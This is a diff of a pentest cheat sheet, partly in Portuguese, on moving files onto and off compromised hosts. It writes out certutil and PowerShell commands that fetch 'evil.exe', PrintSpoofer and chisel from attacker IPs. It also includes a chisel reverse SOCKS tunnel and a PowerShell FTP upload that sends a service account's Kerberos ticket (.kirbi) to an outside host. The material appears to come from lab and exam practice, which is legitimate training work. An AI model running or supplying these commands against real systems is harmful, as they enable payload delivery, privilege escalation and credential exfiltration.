@@ -1,10 +1,8 @@
-Transfering files
-========================
 
-
-# Downloading 
+## Downloading 
 
 ## FTP
+
 Preparing FTP server 
 
     sudo apt update
@@ -106,17 +104,38 @@ OBS: Esse cara complicou a vida por conta do AV Defender em tempo real... Foi pe
 certutil -urlcache -split -f "http://192.168.0.253:8000/nc.cmd" nc.hex
 ```
     
-    certutil -urlcache -split -f "http://192.168.49.120:8000/PrintSpoofer64.exe" ps64.exe
-    certutil -urlcache -split -f "http://192.168.49.120:8000/chisel.exe" chisel.exe
-    .]chisel.exe client 13.37.13.37:3477 R:5000:socks
+```
+certutil -urlcache -split -f "http://192.168.49.120:8000/PrintSpoofer64.exe" ps64.exe
+```
+
+```
+certutil -urlcache -split -f "http://192.168.49.120:8000/chisel.exe" chisel.exe
+```
+
+```
+./chisel.exe client 13.37.13.37:3477 R:5000:socks
+```
+
 ### powershell
 
-    powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
+```
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
+```
     
-    powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'C:/temp/new-exploit.exe')
+```
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'C:/temp/new-exploit.exe')
+```
 
-    powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
-    
+```
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
+```
+
+using invoke-webrequest or wget
+
+```
+Invoke-WebRequest 'http://10.11.0.4/evil.exe' -OutFile c:\evil.exe
+```
+
 
 ### Bash
 
@@ -192,7 +211,9 @@ Salvando esses comandos em um arquivo chamado "comandos_ftp.txt", executar :
 
 ### powershell
 
-    $client = New-Object System.Net.WebClient;$client.Credentials = New-Object System.Net.NetworkCredential("anonymous", "anonymous");$client.UploadFile("ftp://10.10.14.14/test.kirbi", "C:\temp\1-40a10000-sqlsvc@MSSQLSvc~dc1.scrm.local~1433-SCRM.LOCAL.kirbi")
+```
+$client = New-Object System.Net.WebClient;$client.Credentials = New-Object System.Net.NetworkCredential("anonymous", "anonymous");$client.UploadFile("ftp://10.10.14.14/test.kirbi", "C:\temp\1-40a10000-sqlsvc@MSSQLSvc~dc1.scrm.local~1433-SCRM.LOCAL.kirbi")
+```
 
  
 ## HTTP
